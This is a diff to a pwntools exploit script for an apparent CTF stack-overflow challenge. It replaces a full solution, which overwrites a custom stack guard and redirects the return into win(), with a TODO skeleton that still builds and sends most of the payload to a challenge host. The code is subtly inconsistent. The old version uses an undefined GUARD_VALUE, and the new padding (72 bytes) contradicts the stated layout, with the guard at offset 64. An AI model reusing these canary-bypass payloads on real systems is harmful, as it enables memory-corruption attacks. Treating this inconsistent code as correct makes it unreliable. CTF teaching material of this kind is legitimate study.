@@ -1,133 +1,59 @@
-#!usr/bin/env python3
-
+#!/usr/bin/env python3
 """
-Stack Overflow - Canary Bypass Exploit
-S&G Tech CTF Challenge Solution
-
-This exploit overwrites the return address of greet() to redirect execution to win(), while preserving the custom stack guard value to bypass the "stack smashing detected" check.
+Stack Overflow - Exploit Skeleton
+Fill in the TODOs to capture the flag
 """
 
 from pwn import *
 
 # ============================================================
-# Configuration
+# TODO 1: Set the connection target (you get this information when you start the challenge)
 # ============================================================
-
-context.log_level = 'info'
-
-# Remote connection settings
-REMOTE_HOST = 'localhost'
-REMOTE_PORT = 1337
+HOST = 'ctf-containers.dev.dataat.rest'      # Replace with challenge host
+PORT = 'port'                                 # Replace with assigned port
 
 # ============================================================
-# Exploit Parameters
-# ============================================================
-
-# Buffer size in greet() function
-BUFFER_SIZE = 64
-
-# The custom canary guard value from the source (or found via reversing)
-CANARY_VALUE = 0xDEADBEEFDEADC0DE
-
-# Stack layouf of greet():
-# +----------------------------+ (higher addresses)
-# | return address    (8 bytes)| offset 80
-# +----------------------------+
-# | saved RBP         (8 bytes)| offset 72
-# +----------------------------+
-# | guard             (8 bytes)| offset 64 <- must equal GUARD_VALUE
-# +----------------------------+
-# | name[64]          (64 bytes)| offset 0 <- our input starts here
-# +----------------------------+ (lower addresses / RSP)
-
-OFFSET_TO_GUARD = 64
-OFFSET_TO_RET = 80
+# TODO 2: Find the address of the win() function
+#  
+# ====================================================
+WIN_ADDR = 0x0000000000401216 + 1       # Replace with the address of win()
 
 # ============================================================
-# Exploit Functions
+# TODO 3: Figure out what value the guard must be
+#   Hint: objdump -d vuln | grep "movabs"
+#   Hint: The value is an 8-byte constant loaded into a register
 # ============================================================
+GUARD_VALUE = 0xDEADBEEFDEADC0DE    # Replace with the correct guard value
 
-def create_payload(win_addr):
-    """
-    Create the exploit payload.
-    
-    Key Point: a guard variable sits between the buffer and saved RBP.
-    If we blindly overflow with 'A's, the guard check fails and exit() is 
-    called before we reach the ret isntruction. We must write the correct 
-    guard value at the right offset.
-    
-    Payload structure:
-    [64 bytes padding] + [8 bytes guard value] + [8 bytes saved RBP] + [8 bytes win() addr]
-    """
-    
-    payload = b'A' * BUFFER_SIZE            # Fill the name buffer
-    payload += p64(CANARY_VALUE)            # Preserve the guard (bypass the check)
-    payload += b'B' * 8                     # Overwrite saved RBP
-    payload += p64(win_addr)                # Overwrite return address with win()
-    return payload  
-
-def exploit_local(binary_path):
-    """Run the exploit against the local binary."""
-    elf = ELF(binary_path)
-    context.binary = binary_path
-    win_addr = elf.symbols['win']
-    
-    log.info("Starting local exploit...")
-    p = process(binary_path)
-    
-    payload = create_payload(win_addr)
-    log.info(f"Payload length: {len(payload)} bytes")
-    log.info(f"Guard value: {hex(GUARD_VALUE)}")
-    log.info(f"win() address: {hex(win_addr)}")
-    
-    p.recvuntil(b'Enter your name: ')
-    p.sendline(payload)
-    
-    p.recvline()    # "Hello, AAAA...!"
-    response = p.recvall(timeout=2)
-    
-    print("\n" + "=" * 50)
-    print(response.decode(errors='ignore'))
-    print("=" * 50)
-    
-    p.close()
-
-def exploit_remote(binary_path=None):
-    """Run the exploit against the remote server."""
-    if binary_path:
-        elf = ELF(binary_path)
-        win_addr = elf.symbols['win']
-    else:
-        # If no binary available, hardcode the address (find with objdump)
-        win_addr = 0x401196     # UPDATE THIS from: objdump -d vuln | grep "<win>"
-    
-    log.info(f"Connecting to {REMOTE_HOST}:{REMOTE_PORT}...")
-    p = remote(REMOTE_HOST, REMOTE_PORT)
-    
-    payload = create_payload(win_addr)
-    log.info(f"Payload length: {len(payload)} bytes")
-    log.info(f"Guard value: {hex(GUARD_VALUE)}")
-    log.info(f"win() address: {hex(win_addr)}")
-    
-    p.recvuntil(b'Enter your name: ')
-    p.sendline(payload)
-    
-    p.interactive()
-    
 # ============================================================
-# Main
+# TODO 4: Determine the buffer size
+#   Hint: Look at the source or disassembly of greet()
 # ============================================================
+RET_GADGET = 0x40101a
+BUFFER_SIZE = 64      # How big is the name buffer?
 
-if __name__ == "__main__":
-    import sys
-    
-    print("S&G Tech CTF Challenge")
-    print("Stack Overflow")
-    print()
-    
-    if len(sys.argv) > 1 and sys.argv[1] == "remote":
-        binary = sys.argv[2] if len(sys.argv) > 2 else None
-        exploit_remote(binary)
-    else:
-        binary = sys.argv[1] if len(sys.argv) > 2 else '../vuln'
-        exploit_local(binary)
+# ============================================================
+# Build the payload
+# ============================================================
+# Stack layout (low addresses → high addresses):
+#   [  buffer  ] [  ???  ] [  saved RBP  ] [  return address  ]
+#
+# TODO 5: Fill in the payload structure
+#   - Pad the buffer
+#   - Write the guard value (little-endian!) to keep the check happy
+#   - Overwrite saved RBP (can be anything)
+#   - Overwrite the return address with win()
+
+payload = b'A' * 72       # Fill the buffer
+payload += p64(GUARD_VALUE)                    # What goes here?
+payload += b'B' * 8                    # And here?
+payload += p64(RET_GADGET)                    # And here?
+payload += p64(WIN_ADDR)                    # And here?
+
+# ============================================================
+# Send it!
+# ============================================================
+p = remote(HOST, PORT)
+p.recvuntil(b'Enter your name: ')
+p.sendline(payload)
+p.interactive()
